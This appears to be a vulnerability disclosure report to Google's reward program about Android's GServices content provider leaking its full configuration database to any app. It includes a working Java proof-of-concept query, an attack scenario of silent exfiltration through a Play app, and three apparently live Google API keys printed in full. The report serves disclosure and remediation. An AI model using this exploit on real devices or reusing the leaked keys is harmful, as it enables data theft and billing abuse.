# Google VRP Report: GServices Configuration Database Information Disclosure via Normal Permission

## Summary

Any third-party Android application can extract the entire Google Services Framework (GSF) GServices configuration database (1404 entries) — including **Google API keys, internal service URLs/endpoints, certificate hashes, and authentication configuration** — by declaring a single `normal` protection-level permission (`READ_GSERVICES`) that is auto-granted at install time without user interaction.

## Severity

**High** — Confidentiality impact. Mass information disclosure of internal Google infrastructure configuration including API keys, service endpoints, and security configuration. No user interaction required.

## Affected Component

- **Package**: `com.google.android.gsf` (Google Services Framework)
- **Provider**: `com.google.android.gsf.gservices.GservicesProvider`
- **Authority**: `content://com.google.android.gsf.gservices`
- **Permission**: `com.google.android.providers.gsf.permission.READ_GSERVICES` (protectionLevel=**normal**)

## Device Under Test

- **Device**: Google Pixel 6a (bluejay)
- **OS**: Android 17 (CP31.260608.007)
- **Security Patch**: 2026-06-05
- **Build**: CP31.260608.007
- **Account**: sandiyotest@gmail.com

## Vulnerability Details

### Root Cause

The GServices content provider stores 1404+ configuration entries including API keys, internal URLs, certificates, and auth tokens. Access is gated by `READ_GSERVICES` which has `protectionLevel=normal` — meaning ANY installed app receives this permission automatically without user consent or runtime prompt.

### Query Mechanism

The GServicesProvider uses `selectionArgs` (4th parameter) rather than `selection` (3rd parameter) for key lookup. A prefix query with an empty string selectionArgs returns the entire database:

```java
// Extract ALL 1404 entries
Cursor c = getContentResolver().query(
    Uri.parse("content://com.google.android.gsf.gservices/prefix"),
    null, null, new String[]{""}, null);  // selectionArgs=[""]
```

### Leaked Data Categories

| Category | Count | Examples |
|----------|-------|---------|
| **API Keys** | 3 | `AIzaSyB11LJU...` (Copresence), `AIzaSyBUcCP...` (Timezone), `AIzaSyA33f9...` (TTS) |
| **URLs/Endpoints** | 86 | Internal service endpoints, upload URLs, reporting URLs |
| **Certificates** | 10 | Certificate hashes for various services |
| **Auth/Token configs** | 68 | Authentication parameters, token lifetimes, OAuth configs |
| **Location configs** | Multiple | ULR accuracy, delta meters, reporting intervals |
| **Device identity** | 1 | Digest hash: `1-93429ad634b6b0ef49555e121a1f233829720f6b` |

### Specific Leaked API Keys (Confirmed on Device)

```
copresence:api_key = AIzaSyB11LJUdYyY6pjP2NlPPT1pHcxAflWksnc
deskclock:timezone_api_key = AIzaSyBUcCPilPlw0sWDaXdmNScHS4N0jm31D-I
googletts:v2_api_key = AIzaSyA33f9cSqKdR-V4XNkZNZ_rh_dbT1VQJFo
```

## Attack Scenario

1. Attacker publishes a seemingly benign app on Google Play
2. App declares `<uses-permission android:name="com.google.android.providers.gsf.permission.READ_GSERVICES" />` in manifest
3. Permission is **auto-granted at install** (normal protection level = no user prompt)
4. On first launch, app silently queries GServices provider and exfiltrates all 1404 entries
5. Attacker obtains:
   - Google API keys usable for service abuse / quota theft
   - Internal endpoint URLs revealing infrastructure topology
   - Certificate hashes useful for MitM attack planning
   - Auth configuration for understanding Google's authentication flow
   - Location tracking configuration parameters

## Impact

- **Confidentiality**: Complete disclosure of device-level Google configuration (1404 entries)
- **API Key Abuse**: Extracted API keys can be used to make API calls billed to Google's infrastructure
- **Infrastructure Reconnaissance**: 86 internal URLs/endpoints expose Google's service topology
- **Certificate Intelligence**: 10 certificate configs aid in MitM attack planning
- **No User Interaction**: Permission is auto-granted; attack is completely silent
- **Scale**: Affects ALL Pixel devices (and likely all Android devices with Google Services Framework)

## Proof of Concept

### Minimal Reproduction

**AndroidManifest.xml** (only permission needed):
```xml
<uses-permission android:name="com.google.android.providers.gsf.permission.READ_GSERVICES" />
```

**MainActivity.java** (core exploit):
```java
ContentResolver cr = getContentResolver();
Cursor c = cr.query(
    Uri.parse("content://com.google.android.gsf.gservices/prefix"),
    null, null, new String[]{""}, null);
if (c != null) {
    Log.d("EXPLOIT", "Leaked " + c.getCount() + " GServices entries");
    while (c.moveToNext()) {
        String key = c.getString(0);
        String val = c.getString(1);
        // Attacker has full access to ALL config data
        if (val != null && val.startsWith("AIzaSy")) {
            Log.d("EXPLOIT", "API KEY: " + key + " = " + val);
        }
    }
    c.close();
}
```

### Evidence

1. **Logcat output**: 1404 entries extracted including 3 API keys, 86 URLs, 10 certs, 68 auth configs
2. **Permission verification**: `dumpsys package com.vrppoc` confirms `READ_GSERVICES: granted=true` (auto-granted)
3. **Shell comparison**: Shell (UID 2000) gets `SecurityException` for the same query — proving the normal permission is the access gate
4. **Screenshot**: App UI showing extracted data on device

## Recommended Fix

1. **Elevate protection level** of `READ_GSERVICES` from `normal` to `signature|privileged` — only Google-signed apps should access GServices configuration
2. **Filter sensitive entries** — API keys, certificate hashes, and auth configs should not be exposed through the content provider regardless of permission level
3. **Caller validation** — Add UID/package verification in `GservicesProvider.query()` to restrict access to known Google packages

## Timeline

- **2026-07-12**: Vulnerability discovered and confirmed on Pixel 6a, Android 17
